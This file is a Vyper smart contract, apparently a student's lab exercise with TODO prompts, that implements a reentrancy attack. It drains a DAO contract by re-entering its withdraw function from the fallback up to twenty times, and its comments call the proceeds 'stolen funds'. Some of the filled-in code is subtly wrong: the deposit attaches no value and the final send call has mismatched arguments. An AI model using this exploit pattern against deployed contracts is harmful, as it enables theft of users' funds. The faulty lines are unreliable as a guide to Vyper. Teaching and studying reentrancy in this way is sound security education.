interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)
times: public(uint256)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    self.times +=1
    if self.times<20:
        DAO(self.dao_address).withdraw()
    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    deposit_amount: uint256 = msg.value    
    self.times = 0
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    # TODO: make the deposit into the DAO   
    DAO(self.dao_address).deposit()
    # TODO: Start the reentrancy attack
    DAO(self.dao_address).withdraw()
    # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
    send(self,msg.sender)
    

@external
@payable
def __default__():
    # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
    
    # TODO: Add code here to complete the recursive call
    self._attack()
    